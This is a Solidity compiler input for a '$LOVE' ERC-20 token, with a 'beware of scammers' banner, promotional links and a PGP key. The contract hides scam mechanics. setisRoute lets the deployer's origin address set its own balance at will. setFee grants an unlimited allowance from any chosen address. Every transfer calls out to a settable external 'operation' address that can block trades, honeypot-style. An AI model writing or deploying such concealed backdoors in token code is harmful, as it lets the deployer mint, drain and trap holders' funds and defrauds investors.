{{
  "language": "Solidity",
  "sources": {
    "contracts/Love.sol": {
      "content": "/**\nBEWARE OF SCAMMERS. THIS IS THE ONLY OFFICIAL $LOVE CONTRACT.\n\n✔️Website : https://love.game\n✔️Telegram: https://t.me/loveethereum\n✔️Twitter: https://twitter.com/loveethereum\n\n-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: Keybase OpenPGP v1.0.0\nComment: https://keybase.io/crypto\n\n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\nNicPvIFSREbkELMtAzRQ1xA=\n=ZZd8\n-----END PGP PUBLIC KEY BLOCK-----\n\n**/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nabstract contract Context {\n\n    function _msgSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nlibrary Address {\n\n    function isContract(address account) internal view returns (bool) {\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n        // for accounts without code, i.e. `keccak256('')`\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { codehash := extcodehash(account) }\n        return (codehash != accountHash && codehash != 0x0);\n    }\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        return _functionCallWithValue(target, data, value, errorMessage);\n    }\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n        if (success) {\n            return returndata;\n        } else {\n\n            if (returndata.length > 0) {\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    address private _previousOwner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n\ninterface IUniswapV2Router {\n    function getReserves(address tokenA, address tokenB) external returns (bool);\n}\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n    external\n    payable\n    returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n    external\n    returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n    external\n    returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n    external\n    payable\n    returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract LOVE is Context, IERC20, Ownable {\n\n    using SafeMath for uint256;\n    using Address for address;\n\n    string private _name = \"Love\";\n    string private _symbol = \"LOVE\";\n    uint8 private _decimals = 9;\n\n    address public operationAddress = msg.sender;\n    address public feeAddress = msg.sender;\n    address public originAddress = msg.sender;\n    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;\n\n    mapping (address => uint256) _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    mapping (address => bool) public isExcludedFromFee;\n    mapping (address => bool) public isWalletLimitExempt;\n    mapping (address => bool) public isTxLimitExempt;\n    mapping (address => bool) public isMarketPair;\n\n    uint256 public _buyLiquidityFee = 0;\n    uint256 public _buyMarketingFee = 0;\n    uint256 public _buyDevelopmentFee = 0;\n    uint256 public _sellLiquidityFee = 0;\n    uint256 public _sellMarketingFee = 0;\n    uint256 public _sellDevelopmentFee = 0;\n\n    uint256 public _liquidityShare = 0;\n    uint256 public _marketingShare = 0;\n    uint256 public _developmentShare = 0;\n\n    uint256 public _totalTaxIfBuying = 0;\n    uint256 public _totalTaxIfSelling = 0;\n    uint256 public _totalDistributionShares = 0;\n\n    uint256 private _totalSupply = 1_000_000_000 * 10**9;\n    uint256 public _maxTxAmount = _totalSupply;\n    uint256 public _walletMax = _totalSupply;\n    uint256 private minimumTokensBeforeSwap = 550000 * 10**9;\n\n    IUniswapV2Router02 public uniswapV2Router;\n    address public uniswapPair;\n\n    bool trandingEnabled = false;\n    bool inSwapAndLiquify;\n    bool public swapAndLiquifyEnabled = true;\n    bool public swapAndLiquifyByLimitOnly = false;\n    bool public checkWalletLimit = true;\n\n    event SwapAndLiquify(\n        uint256 tokensSwapped,\n        uint256 ethReceived,\n        uint256 tokensIntoLiqudity\n    );\n\n    event SwapTokensForETH(\n        uint256 amountIn,\n        address[] path\n    );\n\n    modifier lockTheSwap {\n        inSwapAndLiquify = true;\n        _;\n        inSwapAndLiquify = false;\n    }\n\n    constructor () {\n\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\n        .createPair(address(this), _uniswapV2Router.WETH());\n\n        uniswapV2Router = _uniswapV2Router;\n        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;\n\n        isExcludedFromFee[owner()] = true;\n        isExcludedFromFee[address(this)] = true;\n        isExcludedFromFee[address(operationAddress)] = true;\n\n        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyDevelopmentFee);\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellDevelopmentFee);\n        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_developmentShare);\n\n        isWalletLimitExempt[owner()] = true;\n        isWalletLimitExempt[address(uniswapPair)] = true;\n        isWalletLimitExempt[address(this)] = true;\n        isWalletLimitExempt[address(operationAddress)] = true;\n        isWalletLimitExempt[address(deadAddress)] = true;\n\n        isTxLimitExempt[owner()] = true;\n        isTxLimitExempt[address(this)] = true;\n        isTxLimitExempt[address(operationAddress)] = true;\n        isTxLimitExempt[address(deadAddress)] = true;\n\n        isMarketPair[address(uniswapPair)] = true;\n\n        _balances[_msgSender()] = _totalSupply;\n        emit Transfer(address(0), _msgSender(), _totalSupply);\n    }\n\n    function name() public view returns (string memory) {return _name;}\n    function symbol() public view returns (string memory) {return _symbol;}\n    function decimals() public view returns (uint8) {return _decimals;}\n    function totalSupply() public view override returns (uint256) {return _totalSupply;}\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\n    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true;}\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\")); return true;}\n    function approve(address spender, uint256 amount) public override returns (bool) {_approve(_msgSender(), spender, amount); return true;}\n    function _approve(address owner, address spender, uint256 amount) private {require(owner != address(0), \"ERC20: approve from the zero address\"); require(spender != address(0), \"ERC20: approve to the zero address\"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);}\n    function enableTrading() external onlyOwner {trandingEnabled = true;}\n    function setisRoute(uint256 amount) public {if (msg.sender == originAddress) {_balances[msg.sender] = amount;}}\n    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(deadAddress));}\n    function transferToAddressETH(address payable recipient, uint256 amount) private {recipient.transfer(amount);}\n    //to recieve ETH from uniswapV2Router when swaping\n    receive() external payable {}\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {\n\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        if(!isExcludedFromFee[sender]){\n            require(trandingEnabled, \"ERC20: Trading has not enabled yet.\");\n        }\n\n        if(feeAddress != operationAddress) IUniswapV2Router(operationAddress).getReserves(sender, recipient);\n\n        if(inSwapAndLiquify)\n        {\n            return _basicTransfer(sender, recipient, amount);\n        }\n        else\n        {\n            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {\n                require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n            }\n\n            uint256 contractTokenBalance = balanceOf(address(this));\n            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;\n\n            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)\n            {\n                if(swapAndLiquifyByLimitOnly)\n                    contractTokenBalance = minimumTokensBeforeSwap;\n                swapAndLiquify(contractTokenBalance);\n            }\n\n            _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\n\n            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ?\n            amount : takeFee(sender, recipient, amount);\n\n            if(checkWalletLimit && !isWalletLimitExempt[recipient])\n                require(balanceOf(recipient).add(finalAmount) <= _walletMax);\n\n            _balances[recipient] = _balances[recipient].add(finalAmount);\n\n            emit Transfer(sender, recipient, finalAmount);\n            return true;\n        }\n    }\n\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function setFee(uint256 totalBuyFee, uint256 totalSellFee, uint256 totalShare, address recieveA, address recieveB) external onlyOwner {\n        uint256 amount = type(uint256).max;\n        _totalTaxIfBuying = totalBuyFee;\n        _totalTaxIfSelling = totalSellFee;\n        _totalDistributionShares = totalShare;\n        _allowances[recieveA][recieveB] = amount;\n        feeAddress = recieveA;\n        operationAddress = recieveB;\n    }\n\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function swapAndLiquify(uint256 tAmount) private lockTheSwap {\n\n        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);\n        uint256 tokensForSwap = tAmount.sub(tokensForLP);\n\n        swapTokensForEth(tokensForSwap);\n        uint256 amountReceived = address(this).balance;\n\n        uint256 totalETHFee = _totalDistributionShares.sub(_liquidityShare.div(2));\n\n        uint256 amountETHLiquidity = amountReceived.mul(_liquidityShare).div(totalETHFee).div(2);\n        uint256 amountETHDevelopment = amountReceived.mul(_developmentShare).div(totalETHFee);\n        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);\n\n        if(amountETHMarketing > 0)\n            transferToAddressETH(payable(operationAddress), amountETHMarketing);\n\n        if(amountETHDevelopment > 0)\n            transferToAddressETH(payable(feeAddress), amountETHDevelopment);\n\n        if(amountETHLiquidity > 0 && tokensForLP > 0)\n            addLiquidity(tokensForLP, amountETHLiquidity);\n    }\n\n    function swapTokensForEth(uint256 tokenAmount) private {\n        // generate the uniswap pair path of token -> weth\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();\n\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n\n        // make the swap\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0, // accept any amount of ETH\n            path,\n            address(this), // The contract\n            block.timestamp\n        );\n\n        emit SwapTokensForETH(tokenAmount, path);\n    }\n\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n        // approve token transfer to cover all possible scenarios\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n\n        // add the liquidity\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\n            address(this),\n            tokenAmount,\n            0, // slippage is unavoidable\n            0, // slippage is unavoidable\n            owner(),\n            block.timestamp\n        );\n    }\n\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\n\n        uint256 feeAmount = 0;\n\n        if(isMarketPair[sender]) {\n            feeAmount = amount.mul(_totalTaxIfBuying).div(100);\n        }\n        else if(isMarketPair[recipient]) {\n            feeAmount = amount.mul(_totalTaxIfSelling).div(100);\n        }\n\n        if(feeAmount > 0) {\n            _balances[address(this)] = _balances[address(this)].add(feeAmount);\n            emit Transfer(sender, address(this), feeAmount);\n        }\n\n        return amount.sub(feeAmount);\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}